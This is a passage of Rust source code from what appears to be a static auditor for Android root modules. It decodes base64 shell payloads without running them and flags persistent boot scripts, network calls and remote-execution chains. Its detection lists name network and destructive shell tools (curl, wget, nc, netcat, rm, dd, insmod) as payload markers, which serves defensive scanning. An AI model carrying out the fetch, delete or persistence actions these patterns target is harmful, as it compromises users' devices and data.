            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }
    let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
    if decoded.len() > remaining {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }
    let digest = sha256_bytes(&decoded);
    if !state.seen_derived.insert(digest) {
        return;
    }
    state.derived_bytes += decoded.len();
    state.derived_artifacts += 1;
    let mut provenance = artifact.provenance;
    provenance.push(format!(
        "{} (layer {})",
        transform,
        artifact.depth.saturating_add(1)
    ));
    scan_artifact(
        Artifact {
            path: artifact.path,
            bytes: decoded,
            provenance,
            depth: artifact.depth + 1,
            force_shell: artifact.force_shell,
        },
        module_id,
        config,
        state,
    );
}

fn decode_static_base64_payloads(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    state: &mut ScanState,
) -> Vec<DecodedCandidate> {
    let mut decoded = Vec::new();
    let mut variables = predefined_variables(module_id);
    for (line_index, line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(line);
        collect_assignments(&tokens, &mut variables);
        for commands in split_pipeline_groups(&tokens) {
            for (decoder_index, command) in commands.iter().enumerate() {
                let expanded: Vec<_> = command
                    .iter()
                    .map(|token| expand_variables(token, &variables))
                    .collect();
                let (name, args) = normalize_command(&expanded);
                if name.is_empty() || !has_decode_flag(&args) {
                    continue;
                }

                let profile = binary_profile_for_command(&name, &state.binary_profiles);
                let openssl_grammar = has_openssl_base64_grammar(&args);
                let known_base64 = name == "base64"
                    || openssl_grammar
                    || profile.is_some_and(|value| value.base64_like || value.openssl_like);
                let feeds_shell = commands.iter().skip(decoder_index + 1).any(|next| {
                    let expanded: Vec<_> = next
                        .iter()
                        .map(|token| expand_variables(token, &variables))
                        .collect();
                    matches!(
                        normalize_command(&expanded).0.as_str(),
                        "sh" | "ash" | "bash"
                    )
                });

                if has_openssl_cipher(&args) {
                    add_finding(
                        state,
                        artifact,
                        RULE_UNAUDITABLE_DECODER,
                        Severity::High,
                        Some(line_index + 1),
                        "Encrypted payload cannot be statically decoded",
                        line.trim(),
                    );
                    continue;
                }

                let encoded = decoder_input(
                    decoder_index,
                    &commands,
                    &args,
                    &variables,
                    module_id,
                    &state.archive_files,
                );
                let Some(encoded) = encoded else {
                    if feeds_shell && profile.is_some() {
                        add_finding(
                            state,
                            artifact,
                            RULE_UNAUDITABLE_DECODER,
                            Severity::High,
                            Some(line_index + 1),
                            "Bundled decoder output cannot be audited",
                            line.trim(),
                        );
                    }
                    continue;
                };
                let Ok(encoded) = std::str::from_utf8(&encoded) else {
                    continue;
                };
                let Some(bytes) = decode_base64(encoded) else {
                    continue;
                };
                if !known_base64 && (profile.is_none() || !looks_like_decoded_payload(&bytes)) {
                    continue;
                }

                let inferred = if name == "base64" {
                    "base64 command".to_owned()
                } else if openssl_grammar {
                    "OpenSSL-compatible argument grammar".to_owned()
                } else if profile.is_some_and(|value| value.base64_like || value.openssl_like) {
                    format!(
                        "bundled decoder binary fingerprint ({})",
                        profile.map_or("unknown", |value| value.path.as_str())
                    )
                } else {
                    format!(
                        "decoded payload content heuristic with bundled binary ({})",
                        profile.map_or("unknown", |value| value.path.as_str())
                    )
                };
                let transform = if name == "base64" {
                    "base64 shell payload"
                } else {
                    "heuristic base64 payload"
                };
                decoded.push(DecodedCandidate {
                    line: line_index + 1,
                    bytes,
                    transform: transform.to_owned(),
                    evidence: format!(
                        "decoded without execution using {inferred}: {}",
                        line.trim()
                    ),
                });
            }
        }
    }
    decoded
}

fn discover_content_base64_payloads(text: &str, module_id: Option<&str>) -> Vec<DecodedCandidate> {
    let mut output = Vec::new();
    let mut seen_encoded = BTreeSet::new();
    let mut variables = predefined_variables(module_id);

    collect_content_candidate(text, 1, "text content", &mut seen_encoded, &mut output);
    for (line_index, line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(line);
        collect_assignments(&tokens, &mut variables);
        for token in &tokens {
            if matches!(token.as_str(), ";" | "|" | "&&" | "||" | "&" | "(" | ")") {
                continue;
            }
            let value = if let Some((name, _)) = token.split_once('=')
                && is_variable_name(name)
            {
                variables.get(name).cloned().unwrap_or_default()
            } else {
                expand_variables(token, &variables)
            };
            collect_content_candidate(
                &value,
                line_index + 1,
                "static shell content",
                &mut seen_encoded,
                &mut output,
            );
            if output.len() >= MAX_CONTENT_CANDIDATES {
                return output;
            }
        }
    }
    output
}

fn collect_content_candidate(
    value: &str,
    line: usize,
    source: &str,
    seen_encoded: &mut BTreeSet<String>,
    output: &mut Vec<DecodedCandidate>,
) {
    if output.len() >= MAX_CONTENT_CANDIDATES || seen_encoded.len() >= MAX_CONTENT_PROBES {
        return;
    }
    let probe_budget = MAX_CONTENT_PROBES - seen_encoded.len();
    let mut candidates = Vec::new();
    let trimmed = value.trim();
    if is_base64_candidate(trimmed) {
        candidates.push(trimmed);
    }

    let mut start = None;
    for (index, character) in value.char_indices() {
        if candidates.len() >= probe_budget {
            start = None;
            break;
        }
        if is_base64_character(character) {
            start.get_or_insert(index);
        } else if let Some(offset) = start.take() {
            candidates.push(&value[offset..index]);
        }
    }
    if let Some(offset) = start {
        candidates.push(&value[offset..]);
    }

    for encoded in candidates {
        let encoded = encoded.trim();
        if !is_base64_candidate(encoded)
            || seen_encoded.len() >= MAX_CONTENT_PROBES
            || !seen_encoded.insert(encoded.to_owned())
            || output.len() >= MAX_CONTENT_CANDIDATES
        {
            continue;
        }
        let Some(bytes) = decode_base64(encoded) else {
            continue;
        };
        if !is_high_confidence_content_payload(&bytes, 0) {
            continue;
        }
        output.push(DecodedCandidate {
            line,
            bytes,
            transform: "content-discovered base64 payload".to_owned(),
            evidence: format!(
                "decoded without relying on a decoder command from {source} ({} encoded bytes)",
                encoded.len()
            ),
        });
    }
}

fn is_base64_candidate(value: &str) -> bool {
    let length = value
        .bytes()
        .filter(|byte| !byte.is_ascii_whitespace())
        .count();
    (MIN_CONTENT_PAYLOAD_LENGTH..=MAX_CONTENT_PAYLOAD_LENGTH).contains(&length)
        && value
            .chars()
            .all(|character| character.is_ascii_whitespace() || is_base64_character(character))
}

fn is_base64_character(character: char) -> bool {
    character.is_ascii_alphanumeric() || matches!(character, '+' | '/' | '-' | '_' | '=')
}

fn is_high_confidence_content_payload(bytes: &[u8], depth: usize) -> bool {
    if looks_like_content_payload(bytes) {
        return true;
    }
    if depth >= MAX_CONTENT_PROBE_DEPTH {
        return false;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    let candidate = text.trim();
    is_base64_candidate(candidate)
        && decode_base64(candidate)
            .is_some_and(|decoded| is_high_confidence_content_payload(&decoded, depth + 1))
}

fn looks_like_content_payload(bytes: &[u8]) -> bool {
    if is_elf(bytes)
        || is_apk("", bytes)
        || bytes.starts_with(&[0x1f, 0x8b])
        || bytes.starts_with(b"#!")
    {
        return true;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    let mut shell_score = 0;
    for line in logical_lines(text) {
        let tokens = shell_tokens(&line);
        for command in split_commands(&tokens) {
            let (name, args) = normalize_command(command);
            if matches!(
                name.as_str(),
                "rm" | "dd" | "curl" | "wget" | "nc" | "netcat" | "insmod" | "modprobe"
            ) {
                return true;
            }
            if matches!(
                name.as_str(),
                "sh" | "ash" | "bash" | "export" | "set" | "echo" | "printf" | "mount" | "umount"
            ) || !args.is_empty() && command.iter().any(|token| is_assignment(token))
            {
                shell_score += 1;
            }
        }
    }
    shell_score >= 2
}

fn has_decode_flag(args: &[String]) -> bool {
    args.iter().any(|arg| {
        matches!(
            arg.as_str(),
            "-d" | "-D" | "--decode" | "-decode" | "-dc" | "-cd"
        )
    })
}

fn has_openssl_base64_grammar(args: &[String]) -> bool {
    args.iter().any(|arg| arg == "base64")
        || args.iter().any(|arg| arg == "enc")
            && args
                .iter()
                .any(|arg| matches!(arg.as_str(), "-a" | "-base64"))
}

fn has_openssl_cipher(args: &[String]) -> bool {
    args.iter().any(|arg| {
        let arg = arg.to_ascii_lowercase();
        arg.starts_with("-aes-")
            || arg.starts_with("-des")
            || arg.starts_with("-chacha")
            || arg.starts_with("-aria")
            || arg.starts_with("-camellia")
    })
}

fn decoder_input(
    decoder_index: usize,
    commands: &[&[String]],
    args: &[String],
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    if decoder_index > 0
        && let Some(payload) = producer_payload(
            commands[decoder_index - 1],
            variables,
            module_id,
            archive_files,
        )
    {
        return Some(payload);
    }
    if let Some(index) = args.iter().position(|arg| arg == "-in")
        && let Some(path) = args.get(index + 1)
    {
        return lookup_archive_file(path, variables, module_id, archive_files);
    }
    let mut positional = Vec::new();
    let mut index = 0;
    while index < args.len() {
        if matches!(args[index].as_str(), "-out" | "-in") {
            index += 2;
            continue;
        }
        let arg = &args[index];
        if arg.starts_with('-') || matches!(arg.as_str(), "enc" | "base64") {
            index += 1;
            continue;
        }
        positional.push(arg);
        index += 1;
    }
    for arg in positional.into_iter().rev() {
        if let Some(bytes) = lookup_archive_file(arg, variables, module_id, archive_files) {
            return Some(bytes);
        }
    }
    None
}

fn producer_payload(
    command: &[String],
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    let expanded: Vec<_> = command
        .iter()
        .map(|token| expand_variables(token, variables))
        .collect();
    let (name, args) = normalize_command(&expanded);
    let operands = operands_before_redirection(&args);
    match name.as_str() {
        "echo" => Some(
            operands
                .iter()
                .filter(|arg| !matches!(arg.as_str(), "-n" | "-e" | "-E"))
                .map(|arg| (*arg).clone())
                .collect::<Vec<_>>()
                .join(" ")
                .into_bytes(),
        ),
        "printf" => {
            let payload = if operands.first().is_some_and(|arg| arg.contains('%')) {
                &operands[1..]
            } else {
                operands.as_slice()
            };
            Some(
                payload
                    .iter()
                    .map(|arg| arg.as_str())
                    .collect::<Vec<_>>()
                    .join("")
                    .into_bytes(),
            )
        }
        "cat" => operands
            .iter()
            .find_map(|path| lookup_archive_file(path, variables, module_id, archive_files)),
        _ => None,
    }
}

fn lookup_archive_file(
    path: &str,
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    let expanded = expand_variables(path, variables);
    let mut candidates = vec![expanded.trim_start_matches("./").to_owned()];
    if let Some(id) = module_id {
        for prefix in [
            format!("/data/adb/modules_update/{id}/"),
            format!("/data/adb/modules/{id}/"),
        ] {
            if let Some(relative) = expanded.strip_prefix(&prefix) {
                candidates.push(relative.to_owned());
            }
        }
    }
    candidates
        .into_iter()
        .find_map(|candidate| archive_files.get(&candidate).cloned())
}

fn binary_profile_for_command<'a>(
    name: &str,
    profiles: &'a [BinaryProfile],
) -> Option<&'a BinaryProfile> {
    let mut matches = profiles.iter().filter(|profile| profile.basename == name);
    let first = matches.next()?;
    matches.next().is_none().then_some(first)
}

fn looks_like_decoded_payload(bytes: &[u8]) -> bool {
    if is_elf(bytes) || bytes.starts_with(&[0x1f, 0x8b]) || bytes.starts_with(b"#!") {
        return true;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    ["rm ", "dd ", "curl ", "wget ", "sh ", "export ", "#!/"]
        .iter()
        .any(|marker| text.contains(marker))
}

type DecodedShellPayload = (usize, Vec<u8>);
type UnresolvedShellPayload = (usize, String);

fn decode_static_shell_commands(
    text: &str,
    module_id: Option<&str>,
) -> (Vec<DecodedShellPayload>, Vec<UnresolvedShellPayload>) {
    let mut decoded = Vec::new();
    let mut unresolved = Vec::new();
    let mut variables = predefined_variables(module_id);
    collect_quoted_constant_assignments(text, &mut variables);
    for (line_index, line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(line);
        collect_assignments_without_empty_overwrite(&tokens, &mut variables);
        for command in split_commands(&tokens) {
            let expanded: Vec<_> = command
                .iter()
                .map(|token| expand_variables(token, &variables))
                .collect();
            let (name, args) = normalize_command(&expanded);
            let payload = if name == "eval" {
                Some(args.join(" "))
            } else if matches!(name.as_str(), "sh" | "ash" | "bash") {
                args.iter()
                    .position(|arg| arg == "-c")
                    .map(|index| args[index + 1..].join(" "))
            } else {
                None
            };
            let Some(payload) = payload else {
                continue;
            };
            if payload.is_empty() {
                continue;
            }
            let payload = expand_variables(&payload, &variables);
            if payload.contains('$') || payload.contains('`') || payload.contains("$(") {
                unresolved.push((line_index + 1, abbreviated_evidence(line)));
            } else {
                decoded.push((line_index + 1, payload.into_bytes()));
            }
        }
    }
    (decoded, unresolved)
}

fn collect_assignments_without_empty_overwrite(
    tokens: &[String],
    variables: &mut BTreeMap<String, String>,
) {
    for token in tokens {
        let Some((name, value)) = token.split_once('=') else {
            continue;
        };
        if !is_variable_name(name) || value.is_empty() && variables.contains_key(name) {
            continue;
        }
        variables.insert(name.to_owned(), expand_variables(value, variables));
    }
}

fn collect_quoted_constant_assignments(text: &str, variables: &mut BTreeMap<String, String>) {
    let chars: Vec<_> = text.chars().collect();
    let mut index = 0;
    let mut line_start = true;
    while index < chars.len() {
        if chars[index] == '\n' || chars[index] == '\r' {
            line_start = true;
            index += 1;
            continue;
        }
        if line_start && matches!(chars[index], ' ' | '\t') {
            index += 1;
            continue;
        }
        if line_start && chars[index] == '#' {
            while index < chars.len() && !matches!(chars[index], '\n' | '\r') {
                index += 1;
            }
            continue;
        }
        line_start = false;
        if !chars[index].is_ascii_alphabetic() && chars[index] != '_' {
            index += 1;
            continue;
        }
        let name_start = index;
        index += 1;
        while index < chars.len() && (chars[index].is_ascii_alphanumeric() || chars[index] == '_') {
            index += 1;
        }
        let name: String = chars[name_start..index].iter().collect();
        if chars.get(index) != Some(&'=') || !matches!(chars.get(index + 1), Some('\'') | Some('"'))
        {
            continue;
        }
        let quote = chars[index + 1];
        index += 2;
        let mut value = String::new();
        let mut terminated = false;
        while index < chars.len() {
            let character = chars[index];
            if character == quote {
                terminated = true;
                index += 1;
                break;
            }
            if character == '\\' && quote == '"' && index + 1 < chars.len() {
                index += 1;
                value.push(chars[index]);
                index += 1;
                continue;
            }
            value.push(character);
            index += 1;
        }
        if terminated && !value.contains("$(") && !value.contains('`') {
            variables.insert(name, expand_variables(&value, variables));
        }
    }
}

fn decode_base64(value: &str) -> Option<Vec<u8>> {
    let mut encoded: Vec<u8> = value
        .bytes()
        .filter(|byte| !byte.is_ascii_whitespace())
        .collect();
    if encoded.is_empty() || encoded.len() % 4 == 1 {
        return None;
    }
    while !encoded.len().is_multiple_of(4) {
        encoded.push(b'=');
    }
    let values: Vec<u8> = encoded
        .into_iter()
        .map(|byte| match byte {
            b'A'..=b'Z' => Some(byte - b'A'),
            b'a'..=b'z' => Some(byte - b'a' + 26),
            b'0'..=b'9' => Some(byte - b'0' + 52),
            b'+' | b'-' => Some(62),
            b'/' | b'_' => Some(63),
            b'=' => Some(64),
            _ => None,
        })
        .collect::<Option<_>>()?;
    if let Some(padding) = values.iter().position(|value| *value == 64)
        && (values.len() - padding > 2 || values[padding..].iter().any(|value| *value != 64))
    {
        return None;
    }
    let mut output = Vec::with_capacity(values.len() / 4 * 3);
    for chunk in values.chunks_exact(4) {
        if chunk[0] >= 64 || chunk[1] >= 64 {
            return None;
        }
        output.push((chunk[0] << 2) | (chunk[1] >> 4));
        if chunk[2] < 64 {
            output.push((chunk[1] << 4) | (chunk[2] >> 2));
        }
        if chunk[3] < 64 {
            if chunk[2] >= 64 {
                return None;
            }
            output.push((chunk[2] << 6) | chunk[3]);
        }
    }
    Some(output)
}

fn add_unpack_size_limit(state: &mut ScanState, artifact: &Artifact, config: &AuditConfig) {
    add_finding(
        state,
        artifact,
        RULE_UNPACK_LIMIT,
        Severity::High,
        None,
        "Unpacking size limit reached",
        &format!("maximum derived size is {} bytes", config.max_derived_size),
    );
}

fn analyze_shell(artifact: &Artifact, text: &str, module_id: Option<&str>, state: &mut ScanState) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );

    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let line_number = line_index + 1;
        let tokens = shell_tokens(raw_line);
        if tokens.is_empty() {
            continue;
        }
        collect_assignments(&tokens, &mut variables);
        collect_block_target_assignments(raw_line, &mut variables);
        collect_block_loop_assignments(&tokens, &mut variables);
        for command in split_commands(&tokens) {
            if command.is_empty() {
                continue;
            }
            let expanded: Vec<_> = command
                .iter()
                .map(|token| expand_variables(token, &variables))
                .collect();
            let (name, args) = normalize_command(&expanded);
            if name.is_empty() {
                continue;
            }
            if name == "cd"
                && let Some(target) = args.first()
            {
                current_dir = resolve_path(target, &variables, &current_dir);
            }
            analyze_network(artifact, line_number, raw_line, &name, &args, state);
            analyze_financial_modification(
                artifact,
                line_number,
                &name,
                &args,
                &variables,
                &current_dir,
                state,
            );
            analyze_privileged_package_actions(artifact, line_number, &name, &args, state);
            analyze_delete(
                artifact,
                line_number,
                raw_line,
                &name,
                &args,
                &variables,
                &current_dir,
                module_id,
                state,
            );
            analyze_writes(
                artifact,
                line_number,
                raw_line,
                &name,
                &args,
                &variables,
                &current_dir,
                state,
            );
        }
    }
}

fn analyze_persistent_script_writes(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );

    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let line = line_index + 1;
        let tokens = shell_tokens(raw_line);
        collect_assignments(&tokens, &mut variables);
        for commands in split_pipeline_groups(&tokens) {
            for (command_index, command) in commands.iter().enumerate() {
                let expanded: Vec<_> = command
                    .iter()
                    .map(|token| expand_variables(token, &variables))
                    .collect();
                let (name, args) = normalize_command(&expanded);
                if name == "cd"
                    && let Some(target) = args.first()
                {
                    current_dir = resolve_path(target, &variables, &current_dir);
                }
                if args.iter().any(|arg| arg == "<<") {
                    continue;
                }

                if matches!(name.as_str(), "cp" | "mv" | "install") {
                    let operands: Vec<_> = operands_before_redirection(&args)
                        .into_iter()
                        .filter(|arg| !arg.starts_with('-'))
                        .collect();
                    if operands.len() >= 2 {
                        let destination = resolve_path(
                            operands.last().expect("checked length"),
                            &variables,
                            &current_dir,
                        );
                        for source in &operands[operands.len() - 2..operands.len() - 1] {
                            let source_path = resolve_path(source, &variables, &current_dir);
                            if let Some(target) =
                                persistent_destination(&destination, Some(&source_path))
                            {
                                let content = lookup_archive_file(
                                    &source_path,
                                    &variables,
                                    module_id,
                                    &state.archive_files,
                                );
                                record_persistent_script(
                                    artifact, line, raw_line, target, content, module_id, config,
                                    state,
                                );
                            }
                        }
                    }
                }

                if name == "tee" {
                    let content = command_index.checked_sub(1).and_then(|previous| {
                        producer_payload(
                            commands[previous],
                            &variables,
                            module_id,
                            &state.archive_files,
                        )
                    });
                    for target in operands_before_redirection(&args)
                        .into_iter()
                        .filter(|arg| !arg.starts_with('-'))
                    {
                        let resolved = resolve_path(target, &variables, &current_dir);
                        if let Some(target) = persistent_destination(&resolved, None) {
                            record_persistent_script(
                                artifact,
                                line,
                                raw_line,
                                target,
                                content.clone(),
                                module_id,
                                config,
                                state,
                            );
                        }
                    }
                }

                let content = recover_redirected_output(
                    command_index,
                    &commands,
                    &args,
                    &variables,
                    module_id,
                    &state.archive_files,
                );
                for window in args.windows(2) {
                    if !matches!(window[0].as_str(), ">" | ">>") {
                        continue;
                    }
                    let resolved = resolve_path(&window[1], &variables, &current_dir);
                    if let Some(target) = persistent_destination(&resolved, None) {
                        record_persistent_script(
                            artifact,
                            line,
                            raw_line,
                            target,
                            content.clone(),
                            module_id,
                            config,
                            state,
                        );
                    }
                }
            }
        }
    }

    for (line, target, content, evidence) in extract_persistent_heredocs(text, module_id) {
        record_persistent_script(
            artifact,
            line,
            &evidence,
            target,
            Some(content),
            module_id,
            config,
            state,
        );
    }
}

fn analyze_invoked_module_scripts(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );
    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(raw_line);
        collect_assignments(&tokens, &mut variables);
        for command in split_commands(&tokens) {
            let (name, args) = normalize_command(command);
            if name == "cd"
                && let Some(target) = args.first()
            {
                current_dir = resolve_path(target, &variables, &current_dir);
            }
            let Some(operand) = invoked_script_operand(command, &variables) else {
                continue;
            };
            let target = resolve_path(&operand, &variables, &current_dir);
            let Some(content) =
                lookup_archive_file(&target, &variables, module_id, &state.archive_files)
            else {
                continue;
            };
            add_finding(
                state,
                artifact,
                RULE_INVOKED_SCRIPT,
                Severity::Info,
                Some(line_index + 1),
                "Module-provided script is invoked",
                &format!("{} => {target}", raw_line.trim()),
            );
            if artifact.depth >= config.max_unpack_depth {
                add_finding(
                    state,
                    artifact,
                    RULE_UNPACK_LIMIT,
                    Severity::High,
                    Some(line_index + 1),
                    "Script call depth limit reached",
                    &format!("maximum depth is {}", config.max_unpack_depth),
                );
                continue;
            }
            let mut provenance = artifact.provenance.clone();
            provenance.push(format!(
                "module script invoked by {}:{}",
                artifact.path,
                line_index + 1
            ));
            scan_artifact(
                Artifact {
                    path: archive_relative_path(&target, module_id).unwrap_or(target),
                    bytes: content,
                    provenance,
                    depth: artifact.depth + 1,
                    force_shell: true,
                },
                module_id,
                config,
                state,
            );
        }
    }
}

fn invoked_script_operand(
    command: &[String],
    variables: &BTreeMap<String, String>,
) -> Option<String> {
    let expanded: Vec<_> = command
        .iter()
        .map(|token| expand_variables(token, variables))
        .collect();
    let mut index = expanded.iter().position(|token| !is_assignment(token))?;
    let mut direct_wrapper = false;
    loop {
        let wrapper = posix_basename(expanded.get(index)?);
        if !matches!(wrapper, "command" | "env" | "exec" | "nohup" | "time") {
            break;
        }
        direct_wrapper = true;
        index += 1;
        while index < expanded.len()
            && (expanded[index].starts_with('-') || is_assignment(&expanded[index]))
        {
            index += 1;
        }
    }

    let executable = expanded.get(index)?;
    let name = posix_basename(executable);
    if matches!(name, "sh" | "ash" | "bash") {
        index += 1;
        while index < expanded.len() {
            if expanded[index] == "-c"
                || expanded[index].starts_with('-')
                    && !expanded[index].starts_with("--")
                    && expanded[index][1..].contains('c')
            {
                return None;
            }
            if expanded[index] == "-o" {
                index += 2;
                continue;
            }
            if expanded[index] == "--" {
                index += 1;
                continue;
            }
            if !expanded[index].starts_with('-') {
                return Some(expanded[index].clone());
            }
            index += 1;
        }
        return None;
    }
    if matches!(name, "." | "source") {
        return expanded.get(index + 1).cloned();
    }
    if direct_wrapper
        || executable.contains('/')
        || executable.starts_with("./")
        || executable.starts_with("../")
    {
        return Some(executable.clone());
    }
    None
}

fn archive_relative_path(path: &str, module_id: Option<&str>) -> Option<String> {
    let id = module_id?;
    [
        format!("/data/adb/modules_update/{id}/"),
        format!("/data/adb/modules/{id}/"),
    ]
    .iter()
    .find_map(|prefix| path.strip_prefix(prefix).map(ToOwned::to_owned))
}

fn recover_redirected_output(
    command_index: usize,
    commands: &[&[String]],
    args: &[String],
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    if let Some(content) =
        producer_payload(commands[command_index], variables, module_id, archive_files)
    {
        return Some(content);
    }
    let expanded: Vec<_> = commands[command_index]
        .iter()
        .map(|token| expand_variables(token, variables))
        .collect();
    let (name, _) = normalize_command(&expanded);
    if has_decode_flag(args)
        && (name == "base64" || has_openssl_base64_grammar(args))
        && let Some(encoded) = decoder_input(
            command_index,
            commands,
            args,
            variables,
            module_id,
            archive_files,
        )
        && let Ok(encoded) = std::str::from_utf8(&encoded)
    {
        return decode_base64(encoded);
    }
    None
}

fn persistent_destination(destination: &str, source: Option<&str>) -> Option<String> {
    const DIRECTORIES: &[&str] = &[
        "/data/adb/service.d",
        "/data/adb/boot-completed.d",
        "/data/adb/bootcompleted.d",
    ];
    for directory in DIRECTORIES {
        if destination == *directory || destination == format!("{directory}/") {
            let source = source?;
            let basename = posix_basename(source);
            if basename.is_empty() {
                return None;
            }
            return Some(format!("{directory}/{basename}"));
        }
        if destination
            .strip_prefix(directory)
            .is_some_and(|suffix| suffix.starts_with('/') && suffix.len() > 1)
        {
            return Some(destination.to_owned());
        }
    }
    None
}

fn is_persistent_script_target(path: &str) -> bool {
    [
        "/data/adb/service.d/",
        "/data/adb/boot-completed.d/",
        "/data/adb/bootcompleted.d/",
    ]
    .iter()
    .any(|directory| path.starts_with(directory) && path.len() > directory.len())
}

#[allow(clippy::too_many_arguments)]
fn record_persistent_script(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    target: String,
    content: Option<Vec<u8>>,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    let Some(content) = content else {
        add_finding(
            state,
            artifact,
            RULE_UNAUDITABLE_PERSISTENT_SCRIPT,
            Severity::High,
            Some(line),
            "Persistent startup script cannot be fully audited",
            &format!("{} => {target}", raw_line.trim()),
        );
        return;
    };
    add_finding(
        state,
        artifact,
        RULE_PERSISTENT_SCRIPT,
        Severity::Notice,
        Some(line),
        "Persistent startup script installed",
        &format!("{} => {target}", raw_line.trim()),
    );
    let mut provenance = artifact.provenance.clone();
    provenance.push(format!(
        "persistent script written by {}:{line}",
        artifact.path
    ));
    scan_derived_bytes(
        Artifact {
            path: target,
            bytes: Vec::new(),
            provenance,
            depth: artifact.depth,
            force_shell: true,
        },
        content,
        "persistent startup script",
        module_id,
        config,
        state,
    );
}

fn extract_persistent_heredocs(
    text: &str,
    module_id: Option<&str>,
) -> Vec<(usize, String, Vec<u8>, String)> {
    let lines = physical_lines(text);
    let mut output = Vec::new();
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );
    let mut index = 0;
    while index < lines.len() {
        let header = lines[index].as_str();
        let tokens = shell_tokens(header);
        collect_assignments(&tokens, &mut variables);
        let (name, args) = normalize_command(&tokens);
        if name == "cd"
            && let Some(target) = args.first()
        {
            current_dir = resolve_path(target, &variables, &current_dir);
        }
        let Some(delimiter_index) = args.iter().position(|arg| arg == "<<") else {
            index += 1;
            continue;
        };
        let Some(raw_delimiter) = args.get(delimiter_index + 1) else {
            index += 1;
            continue;
        };
        let strip_tabs = raw_delimiter.starts_with('-');
        let delimiter = raw_delimiter.trim_start_matches('-');
        let target = args.windows(2).find_map(|window| {
            matches!(window[0].as_str(), ">" | ">>").then(|| {
                let resolved = resolve_path(&window[1], &variables, &current_dir);
                persistent_destination(&resolved, None)
            })?
        });
        let Some(target) = target else {
            index += 1;
            continue;
        };
        let mut body = Vec::new();
        let mut cursor = index + 1;
        let mut terminated = false;
        while cursor < lines.len() {
            let candidate = if strip_tabs {
                lines[cursor].trim_start_matches('\t')
            } else {
                lines[cursor].as_str()
            };
            if candidate == delimiter {
                terminated = true;
                break;
            }
            body.extend_from_slice(candidate.as_bytes());
            body.push(b'\n');
            cursor += 1;
        }
        if terminated {
            output.push((index + 1, target, body, header.to_owned()));
            index = cursor + 1;
        } else {
            index += 1;
        }
    }
    output
}

fn collect_block_target_assignments(line: &str, variables: &mut BTreeMap<String, String>) {
    let Some((left, right)) = line.split_once('=') else {
        return;
    };
    let name = left.split_whitespace().last().unwrap_or_default().trim();
    if !is_variable_name(name) {
        return;
    }
    if right.contains("find_block")
        || right.contains("/dev/block/")
        || right.contains("/dev/mapper/")
    {
        variables.insert(name.to_owned(), "/dev/block/$DYNAMIC".to_owned());
    }
}

fn collect_block_loop_assignments(tokens: &[String], variables: &mut BTreeMap<String, String>) {
    let Some(for_index) = tokens.iter().position(|token| token == "for") else {
        return;
    };
    let Some(name) = tokens.get(for_index + 1) else {
        return;
    };
    if !is_variable_name(name) || tokens.get(for_index + 2).map(String::as_str) != Some("in") {
        return;
    }
    let Some(source) = tokens.get(for_index + 3) else {
        return;
    };
    let expanded = expand_variables(source, variables);
    if is_block_device_path(&expanded)
        || expanded.contains("/dev/block/")
        || expanded.contains("/dev/mapper/")
    {
        variables.insert(name.clone(), expanded);
    }
}

fn analyze_network(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    state: &mut ScanState,
) {
    if let Some(evidence) = shell_network_evidence(name, args, raw_line) {
        add_finding(
            state,
            artifact,
            RULE_NETWORK,
            Severity::Notice,
            Some(line),
            "Outbound network behavior",
            &evidence,
        );
    }
}

fn analyze_remote_execution_chain(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    state: &mut ScanState,
) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );
    let mut downloaded: BTreeMap<String, (usize, String)> = BTreeMap::new();
    let heredoc_lines = heredoc_body_lines(text);

    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let line = line_index + 1;
        if heredoc_lines.contains(&line) {
            continue;
        }
        let tokens = shell_tokens(raw_line);
        collect_assignments(&tokens, &mut variables);
        for command in split_commands(&tokens) {
            let expanded: Vec<_> = command
                .iter()
                .map(|token| expand_variables(token, &variables))
                .collect();
            let (name, args) = normalize_command(&expanded);
            if name == "cd"
                && let Some(target) = args.first()
            {
